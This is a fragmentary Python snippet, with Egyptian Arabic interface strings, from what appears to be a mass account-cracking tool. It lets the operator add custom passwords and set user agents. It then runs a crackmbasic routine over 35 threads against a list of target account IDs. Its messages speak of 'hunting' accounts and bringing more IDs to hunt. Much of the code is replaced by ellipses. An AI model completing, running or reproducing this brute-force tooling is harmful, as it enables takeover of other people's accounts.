...
g= datetime.datetime(2023, 11, 14, 0,  0, 0)
...
#		pwpluss.append('no')
	...
	cetak(panel(f'[bold white]عاوز تضيف باسورد من عندك? Y/T',width=79,title=f"[bold green]اعدادات يوزر اجينت",style="bold hot_pink2")) 
...
def passwrd():
	...
	print(f'\n\t\t\t{P}عارفها بطيئة بس بعدين ح تشكرني ع الصيد🫶 {M}{P}')
		...
		with tred(max_workers=35) as pool:
			for yuzong in id2:
				...
				if 'mobile' in method:
					...
					pool.submit(crackmbasic,idf,pwv)
		print('')
	print(f'  تم فحص جميع الحسابات جيب ايدي تاني وتع صيد منو')
